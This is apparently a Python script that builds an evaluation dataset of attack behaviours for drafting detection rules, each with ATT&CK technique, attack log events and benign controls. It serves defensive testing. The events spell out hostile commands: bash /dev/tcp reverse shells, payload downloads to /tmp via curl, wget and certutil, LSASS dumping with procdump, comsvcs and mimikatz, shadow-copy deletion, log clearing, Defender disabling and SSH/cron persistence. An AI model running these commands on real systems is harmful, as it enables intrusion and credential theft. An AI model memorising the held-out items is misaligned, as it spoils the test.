#!/usr/bin/env python3
"""
Writes datasets/rule_behaviours.jsonl: behaviours to draft detection rules
for (Phase 10). Each has a description, its ATT&CK technique, the attack
events the drafter sees, one known-good event it sees, and held-out attack
and benign events it doesn't (to check the rule generalises and stays
quiet). Events use Logforge's normalised field names (event_type,
process_name, command_line, user, hostname, url, query, ...).

    python tests/eval/ai/rule_behaviours.py
"""

import json
from pathlib import Path

HERE = Path(__file__).resolve().parent


def proc(cmd, name=None, user="bob", host="WS-043"):
    exe = name or cmd.split()[0].split("\\")[-1]
    return {"event_type": "process_creation", "process_name": exe, "command_line": cmd, "user": user,
            "hostname": host}


def web(url, status=200, ip="203.0.113.50"):
    return {"event_type": "http_request", "service": "nginx", "url": url, "status_code": status, "src_ip": ip}


def syslog(service, msg, host="bastion-01"):
    return {"service": service, "message": msg, "hostname": host}


B = []


def behaviour(bid, technique, description, attack, known_good, held_attack, held_benign):
    B.append({"id": bid, "technique": technique, "description": description, "attack": attack,
              "known_good": known_good, "held_out_attack": held_attack, "held_out_benign": held_benign})


behaviour("shadow-delete", "T1490", "Volume shadow copies deleted, as ransomware does before encrypting",
          [proc("vssadmin.exe delete shadows /all /quiet"), proc("vssadmin delete shadows /for=C: /quiet")],
          proc("vssadmin.exe list shadows"),
          [proc("vssadmin.exe Delete Shadows /All /Quiet", user="svc")],
          [proc("vssadmin list writers"), proc("vssadmin.exe list shadowstorage")])
behaviour("lsass-procdump", "T1003.001", "LSASS memory dumped with ProcDump",
          [proc("procdump64.exe -accepteula -ma lsass.exe C:\\Temp\\l.dmp"), proc("procdump.exe -ma lsass.exe out.dmp")],
          proc("procdump.exe -ma notepad.exe n.dmp"),
          [proc("procdump64.exe -ma lsass.exe C:\\Users\\Public\\x.dmp", user="dave")],
          [proc("procdump64.exe -e -ma w3wp.exe"), proc("taskmgr.exe")])
behaviour("log-clear", "T1070.001", "Windows event logs cleared with wevtutil",
          [proc("wevtutil.exe cl Security"), proc("wevtutil cl System")],
          proc("wevtutil.exe qe Security /c:5"),
          [proc("wevtutil.exe cl Application", user="admin")],
          [proc("wevtutil gl Security"), proc("wevtutil.exe el")])
behaviour("encoded-powershell", "T1059.001", "PowerShell run with an encoded command",
          [proc("powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4A"),
           proc("powershell -NoProfile -EncodedCommand JABjAGwAaQBlAG4AdAA=")],
          proc("powershell.exe -File C:\\scripts\\inventory.ps1"),
          [proc("powershell.exe -w hidden -enc ZQBjAGgAbwA=", user="carol")],
          [proc("powershell.exe -Command Get-Service"), proc("powershell.exe -ExecutionPolicy Bypass -File a.ps1")])
behaviour("local-admin-add", "T1098", "An account added to the local Administrators group",
          [proc("net localgroup administrators svc-backup /add"), proc("net.exe localgroup Administrators eve /add")],
          proc("net localgroup administrators"),
          [proc("net1 localgroup administrators mallory /add", name="net1.exe")],
          [proc("net localgroup users"), proc("net user bob")])
behaviour("linux-useradd", "T1136.001", "A local Linux account created",
          [syslog("useradd", "new user: name=svc-backup, UID=1002, GID=1002, home=/home/svc-backup"),
           syslog("useradd", "new user: name=jenkins2, UID=1005, GID=1005, home=/home/jenkins2")],
          syslog("useradd", "new group: name=docker, GID=998"),
          [syslog("useradd", "new user: name=mallory, UID=1010, GID=1010, home=/home/mallory", host="web-1")],
          [syslog("usermod", "change user 'bob' password"), syslog("groupadd", "group added to /etc/group: name=dev")])
behaviour("reverse-shell", "T1059.004", "A reverse shell through bash's /dev/tcp",
          [proc("bash -c bash -i >& /dev/tcp/203.0.113.50/4444 0>&1", user="www-data", host="web-1"),
           proc("bash -i >& /dev/tcp/198.51.100.7/9001 0>&1", user="www-data", host="web-2")],
          proc("bash -c echo started", user="www-data", host="web-1"),
          [proc("sh -c bash -i >& /dev/tcp/192.0.2.9/53 0>&1", name="sh", user="nobody", host="web-1")],
          [proc("bash -c cat /etc/hostname", user="www-data"), proc("bash /opt/app/start.sh", user="app")])
behaviour("download-to-tmp", "T1105", "A file downloaded into /tmp with curl or wget",
          [proc("curl http://203.0.113.50/x.sh -o /tmp/x.sh", user="www-data", host="web-1"),
           proc("wget http://198.51.100.7/a -O /tmp/.a", user="www-data", host="web-1")],
          proc("curl https://api.example.com/health -o /dev/null", user="app", host="web-1"),
          [proc("curl -s http://192.0.2.4/m -o /tmp/m", user="nobody", host="web-2")],
          [proc("curl -o /home/app/data.json https://api.example.com/data", user="app"),
           proc("wget -q https://example.com/index.html -O /var/www/index.html", user="deploy")])
behaviour("ssh-key-added", "T1098.004", "An SSH key appended to root's authorized_keys",
          [proc("bash -c echo ssh-rsa AAAAB3Nza... attacker >> /root/.ssh/authorized_keys", user="root", host="bastion-01"),
           proc("sh -c echo ssh-ed25519 AAAAC3... x >> /root/.ssh/authorized_keys", name="sh", user="root", host="jump-3")],
          proc("cat /root/.ssh/authorized_keys", user="root", host="bastion-01"),
          [proc("bash -c echo ssh-rsa AAAAB3... y >> /root/.ssh/authorized_keys", user="root", host="web-2")],
          [proc("ssh-keygen -l -f /root/.ssh/authorized_keys", user="root"), proc("ls -la /root/.ssh", user="root")])
behaviour("cron-persistence", "T1053.003", "A crontab entry that runs a file from /tmp",
          [proc("bash -c (crontab -l; echo '* * * * * /tmp/.x') | crontab -", user="www-data", host="web-1"),
           proc("sh -c echo '*/5 * * * * /tmp/upd' | crontab -", name="sh", user="nobody", host="web-2")],
          proc("crontab -l", user="deploy", host="web-1"),
          [proc("bash -c (crontab -l; echo '@reboot /tmp/.y') | crontab -", user="app", host="web-1")],
          [proc("crontab -e", user="deploy"), proc("bash -c crontab -l | grep backup", user="deploy")])
behaviour("schtasks-create", "T1053.005", "A scheduled task created that runs a program from a temp folder",
          [proc("schtasks /create /tn Updater /tr C:\\Users\\Public\\upd.exe /sc minute"),
           proc("schtasks.exe /Create /TN svc /TR C:\\Windows\\Temp\\s.exe /SC ONLOGON")],
          proc("schtasks /query /fo LIST"),
          [proc("schtasks /create /tn x /tr C:\\ProgramData\\x.exe /sc daily", user="eve")],
          [proc("schtasks /run /tn Backup"), proc("schtasks /query /tn Updater")])
behaviour("certutil-download", "T1105", "certutil used to download a file",
          [proc("certutil.exe -urlcache -split -f http://203.0.113.50/a.exe C:\\Temp\\a.exe"),
           proc("certutil -urlcache -f http://198.51.100.7/p.txt p.txt")],
          proc("certutil -hashfile setup.exe SHA256"),
          [proc("certutil.exe -urlcache -split -f https://192.0.2.1/b.dll b.dll", user="eve")],
          [proc("certutil -dump cert.cer"), proc("certutil.exe -verify -urlfetch cert.cer")])
behaviour("comsvcs-minidump", "T1003.001", "LSASS dumped through comsvcs.dll MiniDump",
          [proc("rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Temp\\l.dmp full"),
           proc("rundll32 comsvcs.dll MiniDump 712 out.bin full")],
          proc("rundll32.exe shell32.dll,Control_RunDLL desk.cpl"),
          [proc("rundll32.exe comsvcs.dll,#24 640 C:\\x.dmp full", user="eve")],
          [proc("rundll32.exe printui.dll,PrintUIEntry /il"), proc("rundll32 url.dll,FileProtocolHandler a.html")])
behaviour("dyndns-query", "T1071.004", "DNS lookups of dynamic-DNS domains often used for command and control",
          [{"event_type": "dns_query", "query": "c2-node.duckdns.org", "hostname": "WS-051"},
           {"event_type": "dns_query", "query": "updates.duckdns.org", "hostname": "WS-043"}],
          {"event_type": "dns_query", "query": "www.google.com", "hostname": "WS-043"},
          [{"event_type": "dns_query", "query": "x1.duckdns.org", "hostname": "WS-012"}],
          [{"event_type": "dns_query", "query": "duck.com", "hostname": "WS-043"},
           {"event_type": "dns_query", "query": "login.microsoftonline.com", "hostname": "WS-043"}])
behaviour("webshell-request", "T1505.003", "A request running a command through a web shell",
          [web("/uploads/shell.php?cmd=whoami"), web("/uploads/img.php?cmd=id")],
          web("/uploads/avatar.png"),
          [web("/uploads/a.php?cmd=uname+-a", ip="198.51.100.7")],
          [web("/search?q=cmd+line+tools"), web("/uploads/report.pdf")])
behaviour("sqli-union", "T1190", "A SQL injection attempt with UNION SELECT in the URL",
          [web("/products?id=1 UNION SELECT username,password FROM users--", status=500),
           web("/item?id=2 union select null,version()--", status=500)],
          web("/search?q=union+station+hotels"),
          [web("/p?id=3 UNION ALL SELECT 1,2,3--", status=500, ip="198.51.100.9")],
          [web("/search?q=select+a+union+rep"), web("/blog/union-select-committee")])
behaviour("defender-disable", "T1562.001", "Microsoft Defender real-time protection switched off",
          [proc("powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true"),
           proc("powershell -Command Set-MpPreference -DisableRealtimeMonitoring 1")],
          proc("powershell.exe Get-MpPreference"),
          [proc("powershell.exe -c Set-MpPreference -DisableRealtimeMonitoring $True", user="eve")],
          [proc("powershell.exe Set-MpPreference -SignatureUpdateInterval 4"), proc("powershell Get-MpComputerStatus")])
behaviour("kerberoast", "T1558.003", "A Kerberos service ticket requested with RC4 encryption (Kerberoasting)",
          [{"event_id": 4769, "ticket_encryption_type": "0x17", "service_name": "MSSQLSvc", "user": "bob"},
           {"event_id": 4769, "ticket_encryption_type": "0x17", "service_name": "HTTP/web", "user": "eve"}],
          {"event_id": 4769, "ticket_encryption_type": "0x12", "service_name": "MSSQLSvc", "user": "bob"},
          [{"event_id": 4769, "ticket_encryption_type": "0x17", "service_name": "CIFS/fs01", "user": "dave"}],
          [{"event_id": 4769, "ticket_encryption_type": "0x12", "service_name": "HTTP/web", "user": "carol"},
           {"event_id": 4768, "ticket_encryption_type": "0x17", "user": "carol"}])
behaviour("whoami-priv", "T1033", "Privilege discovery with whoami /priv or /all",
          [proc("whoami /priv"), proc("whoami.exe /all")],
          proc("whoami"),
          [proc("whoami /all", user="eve")],
          [proc("whoami /upn"), proc("whoami.exe")])
behaviour("mimikatz", "T1003.001", "Mimikatz run to extract credentials",
          [proc("mimikatz.exe \"sekurlsa::logonpasswords\" exit"), proc("mimikatz.exe privilege::debug sekurlsa::wdigest")],
          proc("mimic.exe --help"),
          [proc("C:\\Temp\\mimikatz.exe \"lsadump::sam\" exit", name="mimikatz.exe", user="eve")],
          [proc("notepad.exe katz.txt"), proc("mimic.exe run")])


def main():
    out = HERE / "datasets" / "rule_behaviours.jsonl"
    out.write_text("".join(json.dumps(b, sort_keys=True) + "\n" for b in B))
    print(f"{out}: {len(B)} behaviours")


if __name__ == "__main__":
    main()
